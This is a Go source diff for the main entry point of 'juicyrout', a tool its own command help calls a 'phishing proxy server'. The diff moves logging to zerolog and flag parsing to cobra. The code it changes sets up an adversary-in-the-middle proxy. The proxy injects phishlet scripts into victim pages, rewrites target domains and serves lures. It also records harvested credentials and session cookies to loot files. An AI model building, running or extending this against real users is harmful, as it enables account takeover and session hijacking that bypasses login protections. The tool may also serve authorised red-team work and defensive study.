@@ -2,10 +2,8 @@ package main
 
 import (
 	_ "embed"
-	"flag"
 	"fmt"
 	"io/fs"
-	"log"
 	"net"
 	"net/http"
 	"os"
@@ -20,6 +18,8 @@ import (
 	"github.com/gofiber/fiber/v2/middleware/session"
 	"github.com/gofiber/fiber/v2/utils"
 	"github.com/gofiber/storage/memory"
+	"github.com/rs/zerolog"
+	"github.com/spf13/cobra"
 )
 
 //go:embed js/change-url.js
@@ -55,14 +55,14 @@ func setupDomainConverter(conf *appConfig) DomainConverter {
 	return conv
 }
 
-func setupRequestProcessor(conv DomainConverter, userAgentSaver UserAgentSaver) RequestProcessor {
-	requestURLProc := newURLRegexProcessor(func(domain string) string {
+func setupRequestProcessor(log *zerolog.Logger, conv DomainConverter, userAgentSaver UserAgentSaver) RequestProcessor {
+	requestURLProc := newURLRegexProcessor(log, func(domain string) string {
 		return conv.ToTargetDomain(domain)
 	})
 	return NewRequestProcessor(conv, requestURLProc, userAgentSaver)
 }
 
-func setupResponseProcessor(conf *appConfig, conv DomainConverter,
+func setupResponseProcessor(log *zerolog.Logger, conf *appConfig, conv DomainConverter,
 	cookieSaver CookieSaver, authService AuthService, lureService LureService) ResponseProcessor {
 	baseScript := fmt.Sprintf(`
 	var baseDomain = "%s"
@@ -70,23 +70,23 @@ func setupResponseProcessor(conf *appConfig, conv DomainConverter,
 	scripts := []string{baseScript, changeURLScript, fetchHookScript}
 	scripts = append(scripts, conf.Phishlet.JsFilesBody...)
 	injectScript := strings.Join(scripts, "\n")
-	htmlProc := newHTMLRegexProcessor(conv, injectScript)
-	responseURLProc := newURLRegexProcessor(func(domain string) string {
+	htmlProc := newHTMLRegexProcessor(log, conv, injectScript)
+	responseURLProc := newURLRegexProcessor(log, func(domain string) string {
 		return conv.ToProxyDomain(domain)
 	})
-	return NewResponseProcessor(conv, responseURLProc, htmlProc, cookieSaver, authService, lureService)
+	return NewResponseProcessor(log, conv, responseURLProc, htmlProc, cookieSaver, authService, lureService)
 }
 
-func setupProxyHandler(conf *appConfig, conv DomainConverter,
+func setupProxyHandler(log *zerolog.Logger, conf *appConfig, conv DomainConverter,
 	cookieSaver CookieSaver, lootService *lootService, lureService LureService) fiber.Handler {
 	client := setupHTTPClient()
-	req := setupRequestProcessor(conv, lootService)
-	resp := setupResponseProcessor(conf, conv, cookieSaver, lootService, lureService)
-	return NewProxyHandler(client, req, resp)
+	req := setupRequestProcessor(log, conv, lootService)
+	resp := setupResponseProcessor(log, conf, conv, cookieSaver, lootService, lureService)
+	return NewProxyHandler(log, client, req, resp)
 }
 
-func setupAuthHandler(conf *appConfig, conv DomainConverter, lureService LureService,
-	lootService *lootService) fiber.Handler {
+func setupAuthHandler(log *zerolog.Logger, conf *appConfig,
+	conv DomainConverter, lureService LureService, lootService *lootService) fiber.Handler {
 
 	storage := NewSessionStorage(memory.New(), lootService)
 	store := session.New(session.Config{
@@ -97,7 +97,7 @@ func setupAuthHandler(conf *appConfig, conv DomainConverter, lureService LureSer
 		CookieHTTPOnly: true,
 		Storage:        storage,
 	})
-	sm := NewSessionManager(store, conf.SessionCookieName)
+	sm := NewSessionManager(log, store, conf.SessionCookieName)
 	storage.AddSessionDeleter(sm)
 	authConf := AuthConfig{
 		SessionManager: sm,
@@ -109,10 +109,10 @@ func setupAuthHandler(conf *appConfig, conv DomainConverter, lureService LureSer
 	if conf.NoAuth {
 		return NewNoAuthMiddleware(authConf)
 	}
-	return NewAuthMiddleware(authConf)
+	return NewAuthMiddleware(log, authConf)
 }
 
-func setupApp(limit, api, auth, proxy fiber.Handler) *appServer {
+func setupApp(log *zerolog.Logger, limit, api, auth, proxy fiber.Handler) *appServer {
 	app := fiber.New(fiber.Config{
 		StreamRequestBody:     true,
 		DisableStartupMessage: true,
@@ -122,8 +122,7 @@ func setupApp(limit, api, auth, proxy fiber.Handler) *appServer {
 	app.Use(recover.New(recover.Config{
 		EnableStackTrace: true,
 		StackTraceHandler: func(e interface{}) {
-			log.Println("panic: ", e)
-			log.Println("stack: ", utils.UnsafeString(debug.Stack()))
+			log.Error().Any("recover", e).Str("stack", utils.UnsafeString(debug.Stack())).Msg("recover from panic")
 		},
 	}))
 	app.Use(limit)
@@ -143,7 +142,7 @@ func setupApp(limit, api, auth, proxy fiber.Handler) *appServer {
 	}
 	// for CORS preflight requests
 	app.Options("/*", api, proxy)
-	return &appServer{app: app}
+	return &appServer{log: log, app: app}
 }
 
 type hostFS struct{}
@@ -154,49 +153,89 @@ func (hostFS) Open(name string) (fs.File, error) {
 
 var osFS hostFS
 
-// TODO refactor logging
 func main() {
-	var configFile, envFile string
-	flag.StringVar(&configFile, "c", "", "yaml config file")
-	flag.StringVar(&envFile, "e", "", "dotenv config file")
-	flag.Parse()
-	if envFile == "" {
+	logger := zerolog.New(zerolog.ConsoleWriter{Out: os.Stderr, TimeFormat: time.RFC3339}).With().Timestamp().Logger()
+	if err := newServerCmd(&logger).Execute(); err != nil {
+		logger.Error().Err(err).Msg("failed to start server")
+		os.Exit(1)
+	}
+}
+
+func newServerCmd(log *zerolog.Logger) *serverCmd {
+	c := &serverCmd{log: log}
+	cmd := &cobra.Command{
+		Use:           "juicyrout [flags]",
+		Example:       "juicyrout -c config.yaml",
+		Short:         "Start phishing proxy server",
+		SilenceErrors: true,
+		RunE: func(_ *cobra.Command, _ []string) (err error) {
+			return c.run()
+		},
+	}
+	c.opts.initCliFlags(cmd)
+	c.cmd = cmd
+	return c
+}
+
+func (c *serverCmd) Execute() error {
+	return c.cmd.Execute()
+}
+
+type serverCmd struct {
+	log  *zerolog.Logger
+	cmd  *cobra.Command
+	opts serverCmdOpts
+}
+
+type serverCmdOpts struct {
+	configFile   string
+	envFile      string
+	verboseLevel int
+}
+
+func (o *serverCmdOpts) initCliFlags(cmd *cobra.Command) {
+	cmd.Flags().StringVarP(&o.configFile, "config", "c", "", "yaml config file")
+	cmd.Flags().StringVarP(&o.envFile, "env", "e", "", "dotenv config file")
+	cmd.Flags().CountVarP(&o.verboseLevel, "verbose", "v", "log verbose level")
+}
+
+func (c *serverCmd) run() error {
+	c.log = setLogLevel(c.log, c.opts.verboseLevel)
+	if c.opts.envFile == "" {
 		if _, err := os.Stat(".env"); err == nil {
-			envFile = ".env"
+			c.opts.envFile = ".env"
 		}
 	}
 
-	conf, err := setupAppConfig(osFS, configFile, envFile)
+	conf, err := setupAppConfig(osFS, c.opts.configFile, c.opts.envFile)
 	if err != nil {
-		log.Fatal(err)
+		return err
 	}
 
 	credsFile, err := os.OpenFile(conf.CredsFile, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0644)
 	if err != nil {
-		log.Fatal(err)
+		return err
 	}
 	defer credsFile.Close()
-	lootRepo := NewFileLootRepository(credsFile)
+	lootRepo := NewFileLootRepository(c.log, credsFile)
 
 	sessionsFile, err := os.OpenFile(conf.SessionsFile, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0644)
 	if err != nil {
-		log.Println(err)
-		return
+		return err
 	}
 	defer sessionsFile.Close()
 	sessionRepo := NewFileSessionRepository(sessionsFile)
-	lootService := NewLootService(lootRepo, sessionRepo, conf.Phishlet.SessionCookies)
+	lootService := NewLootService(c.log, lootRepo, sessionRepo, conf.Phishlet.SessionCookies)
 	cookieService := NewCookieService()
 	cookieSaver := NewMultiCookieSaver(cookieService, lootService)
 
 	conv := setupDomainConverter(conf)
 	lureService, err := NewLureService(&FileByteSource{conf.LuresFile})
 	if err != nil {
-		log.Println(err)
-		return
+		return err
 	}
-	auth := setupAuthHandler(conf, conv, lureService, lootService)
-	api := NewAPIMiddleware(APIConfig{
+	auth := setupAuthHandler(c.log, conf, conv, lureService, lootService)
+	api := NewAPIMiddleware(c.log, APIConfig{
 		APIHostname:     conf.APIHostname,
 		APIToken:        conf.APIToken,
 		DomainConverter: conv,
@@ -205,24 +244,23 @@ func main() {
 		LureService:     lureService,
 		CookieSaver:     cookieSaver,
 	})
-	proxy := setupProxyHandler(conf, conv, cookieSaver, lootService, lureService)
+	proxy := setupProxyHandler(c.log, conf, conv, cookieSaver, lootService, lureService)
 
 	limit := limiter.New(limiter.Config{
 		Max:        conf.LimitMax,
 		Expiration: conf.LimitExpiration,
 	})
-	app := setupApp(limit, api, auth, proxy)
-	if err = app.Listen(conf); err != nil {
-		log.Println("listen error", err)
-	}
+	app := setupApp(c.log, limit, api, auth, proxy)
+	return app.Listen(conf)
 }
 
 type appServer struct {
+	log *zerolog.Logger
 	app *fiber.App
 }
 
 func (s *appServer) Listen(conf *appConfig) error {
-	log.Printf("listening on %s", conf.ListenAddr)
+	s.log.Info().Msgf("listening on %s", conf.ListenAddr)
 	if conf.TLSKey != "" {
 		return s.app.ListenTLS(conf.ListenAddr, conf.TLSCert, conf.TLSKey)
 	}
